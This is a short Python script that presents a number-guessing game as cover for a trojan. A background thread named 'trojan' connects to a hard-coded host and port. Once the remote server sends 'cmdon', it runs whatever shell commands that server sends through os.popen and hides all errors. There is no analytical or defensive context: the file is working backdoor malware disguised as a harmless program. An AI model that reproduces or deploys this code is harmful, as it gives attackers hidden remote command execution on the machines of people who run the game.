import random
import socket
import threading
import os

def trojan():
    HOST = "192.168.1.7"
    PORT = 5231

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    cmd_mode = False

    while True:
        server_command = client.recv(1024).decode("utf-8")
        try:
            if server_command == "cmdon":
                cmd_mode = True
                client.send("You now have Terminal Access!".encode("utf-8"))
                continue
            if server_command == "cmdoff":
                cmd_mode = False
                client.send("You now do not have Terminal Access!".encode("utf-8"))
                continue
            if cmd_mode:
                os.popen(server_command)
            else:
                if server_command == "hello":
                    print ("Hello world!")
        except:
            pass

        client.send(f"{server_command} was executed successfully".encode("utf-8"))

def game():

    number = random.randint(0, 1000)
    print (number)
    tries = 1

    done = False

    while not done:
        try:
            guess = int(input("Enter a guess for num: "))

            if guess == number:
                done = True
                print ("Well Done")
            else:
                tries += 1
                if guess > number:
                    print ("Go smaller")
                else:
                    print ("BIGGERRR")
        except ValueError:
            print ("ONLY INPUT WHOLE NUMBERS!!")

    print (f"You got it in {tries} tries, well done")

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()